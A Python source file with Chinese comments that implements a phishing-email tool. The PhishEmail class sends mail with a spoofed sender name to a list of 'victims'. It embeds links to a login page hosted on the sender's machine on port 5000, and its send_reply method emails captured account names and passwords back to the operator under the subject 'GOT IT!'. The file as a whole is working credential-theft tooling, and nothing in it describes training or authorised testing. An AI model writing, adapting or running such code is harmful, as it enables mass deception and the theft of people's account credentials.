# -*- coding: gbk -*-
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket

#负责发送钓鱼邮件
class PhishEmail:
    __SENDER_REQUIRED_KEY = ['Host', 'Port', 'Email', 'Password']
    __sender = {}
    __sender_is_initialized = False

    __victims = []
    __victims_is_initialized = False

    __CONTENT_REQUIRED_KEY = ['Content Type', 'Disguised Name', 'Subject']
    __content = []
    __content_is_initialized = False

    def __init__(self, sender_data = None, victims_data = None, content_data = None):
        '''
        构造函数，设置发送方、受害者和内容数据。
        '''
        if sender_data is not None:
            self.set_sender(sender_data)
        if victims_data is not None:
            self.set_victims(victims_data)
        if content_data is not None:
            self.set_content(content_data)

    def set_sender(self, data):
        '''
        设置发送方数据。

        参数：
        data (dict): 发送方数据
        '''
        if isinstance(data, dict) and all(key in self.__SENDER_REQUIRED_KEY for key in data):
            self.__sender = data
            self.__sender_is_initialized = True
        else: print('Set sender failed.')

    def set_victims(self, _data):
        '''
        设置受害者数据。

        参数：
        data (list): 受害者数据
        '''
        if isinstance(_data, list) and len(_data) > 0:
            self.__victims = _data
            self.__victims_is_initialized = True
        else: print('Set victim failed.')

    def set_content(self, _data):
        '''
        设置内容数据。

        参数：
        data (dict): 内容数据
        '''
        if isinstance(_data, dict) and all(key in _data for key in self.__CONTENT_REQUIRED_KEY):
            self.__content = _data
            self.__content_is_initialized = True
        else: print('Set content failed.')

    def send(self, victim_number = -1):
        '''
        向受害者邮箱发送钓鱼邮件。

        参数：
        victim_number (int): 受害者数量，默认为-1，表示全部受害者，否则表示发送的受害者数量，将向受害者数据的前victim_number个邮箱发送邮件

        返回：
        list: 发送成功的受害者邮箱列表，发送失败则返回None
        '''
        if self.__sender_is_initialized and self.__victims_is_initialized and self.__content_is_initialized:
            return_list = [self.__sender['Email']]
            victim_number = len(self.__victims) if victim_number < 0 or victim_number >= len(self.__victims) else victim_number

            for victim_index in range(victim_number):
                server = self.__connect_server()
                if server is not None:
                    message = self.__create_message(self.__victims[victim_index])
                    is_success = self.__send_message(self.__victims[victim_index], message, server)
                    if is_success:
                        return_list.append(self.__victims[victim_index])
                        self.__update_progress(victim_index, victim_number)
                    else:
                        print(f'Send phish email to {self.__victims[victim_index]} failed. Send message failed.')
                    server.quit()
                else:
                    print(f'Send phish email to {self.__victims[victim_index]} failed. Server connect failed.')
            return return_list

        else:
            if not self.__sender_is_initialized:
                print('Send phish email failed. Sender is not initialized')
            elif not self.__victims_is_initialized:
                print('Send phish email failed. Victims is not initialized')
            elif not self.__content_is_initialized:
                print('Send phish email failed. Content is not initialized')
            return None

    def send_reply(self, account, password):
        '''
        向发送者发送回复，如果有受害者通过钓鱼邮件进入钓鱼网站，并且输入了账户密码，则向发送者邮箱发送标题为“GOT IT!”的邮件，邮件内包含钓到的账户密码，钓鱼成功。

        参数：
        account (str): 钓鱼钓到的账号
        password (str): 钓鱼钓到的密码
        '''
        if self.__sender_is_initialized and self.__victims_is_initialized and self.__content_is_initialized:
            server = self.__connect_server()
            if (server is not None):
                message = MIMEMultipart()
                message['From'] = self.__sender['Email']
                message['To'] = self.__sender['Email']
                message['Subject'] = 'GOT IT!'
                text = f'Account: {account}\nPassword: {password}'
                message.attach(MIMEText(text, 'plain'))
                is_success = self.__send_message(self.__sender['Email'], message, server)
                if not is_success: print('Send reply failed. Send message failed.')
            else: print('Send reply failed. Server connect failed.')
        else:
            if not self.__sender_is_initialized:
                print('Send phish email failed. Sender is not initialized')
            elif not self.__victims_is_initialized:
                print('Send phish email failed. Victims is not initialized')
            elif not self.__content_is_initialized:
                print('Send phish email failed. Content is not initialized')


    def __connect_server(self):
        '''
        连接邮件服务器。

        返回：
        server (SMTP_SSL): 连接成功返回服务器对象，否则返回None。
        '''
        try:
            server = smtplib.SMTP_SSL(self.__sender['Host'], self.__sender['Port'])
            server.login(self.__sender['Email'], self.__sender['Password'])
            return server
        except Exception as exception:
            print(f'Connect server failed.\n{exception}')
            return None

    def __create_message(self, victim):
        '''
        创建邮件，根据内容数据创建不同类型的邮件。

        参数：
        victim (str): 受害者邮箱

        返回：
        message (MIMEMultipart): 邮件，创建失败则返回空
        '''
        try:
            message = MIMEMultipart()
            message['From'] = f"{self.__content['Disguised Name']} <{self.__sender['Email']}>"  #伪装发送者的名字
            message['To'] = victim
            message['Subject'] = self.__content['Subject']

            if self.__content['Content Type'] == 'Only Text':   #如果是纯文本，直接添加文本
                text = self.__content['Text']
                message.attach(MIMEText(text, 'plain'))
            elif self.__content['Content Type'] == 'URL':       #如果是URL，将文本中的\t替换为钓鱼网站链接
                ip = self.__get_ip()
                text = self.__content['Text'].replace('\t', f"<a href='http://{ip}:5000/login' style='color:blue'>{self.__content['URL Text']}</a>").replace('\n', '<br>')
                message.attach(MIMEText(text, 'html'))
            elif self.__content['Content Type'] == 'HTML':      #如果是HTML，读取HTML文件内容，将PHISH WEBSITE替换为钓鱼网站链接
                filepath = os.path.join('.', 'templates', self.__content['HTML Name'])
                with open(filepath, 'r', encoding='utf-8') as file:
                    content = file.read()
                ip = self.__get_ip()
                content = content.replace('PHISH WEBSITE', f'http://{ip}:5000/login')
                message.attach(MIMEText(content, 'html'))
            else:
                print('Create MIME failed. Invalid Content Type.')
                message = None
            return message
        except Exception as exception:
            print(f'Create MIME failed.\n{exception}')
            return None

    def __send_message(self, target, message, server):
        '''
        发送邮件。

        参数：
        target (str): 目标邮箱
        message (MIMEMultipart): 邮件
        server (SMTP_SSL): 服务器

        返回：
        bool: 发送成功返回True，否则返回False
        '''
        try:
            server.sendmail(self.__sender['Email'], target, message.as_string())
            return True
        except Exception as exception:
            print(f'Send message failed.\n{exception}')
            return False

    def __update_progress(self, current, maximum):
        '''
        在控制台显示并更新进度条。

        参数：
        current (int): 当前进度
        maximum (int): 最大进度
        '''
        current = current + 1
        progress = current / maximum
        bar_length = 40
        blocked_bar = int(round(bar_length * progress))
        full_bar = "#" * blocked_bar + "-" * (bar_length - blocked_bar)
        print(f"\r[{full_bar}] {current}/{maximum}", end='')
        if current == maximum: print('\n')

    def __get_ip(self):
        '''
        获取本机ip。

        返回：
        str: 本机ip，获取失败则返回None。
        '''
        ip = None
        hostname = socket.gethostname()
        all_address_info = socket.getaddrinfo(hostname, None)

        #*********************************************************************************************************************
        #这个方法不一定能获取到正确的本机IP地址，如果获取的IP地址错误，需要手动修改这个函数
        #取消注释，直接返回正确的IP地址字符串
        #This method may not get the correct local IP address, if you get the wrong IP address, you need to manually modify this function
        #Uncomment and return the correct IP address string
        #ip = '192.168.1.1'
        #*********************************************************************************************************************

        if ip is None:
            #获取本机所有ipv4地址
            ip_list = []
            for address_info in all_address_info:
                address = address_info[4][0]
                if ':' not in address:
                    ip_list.append(address)

            #本机可能存在多个ipv4地址，选择最小地址
            if len(ip_list) != 0:
                ip_list.sort(key=lambda ip: (int(ip.split('.')[2]), int(ip.split('.')[3])))
                ip = ip_list[0]
            else:
                print('Get ip failed.')
        return ip
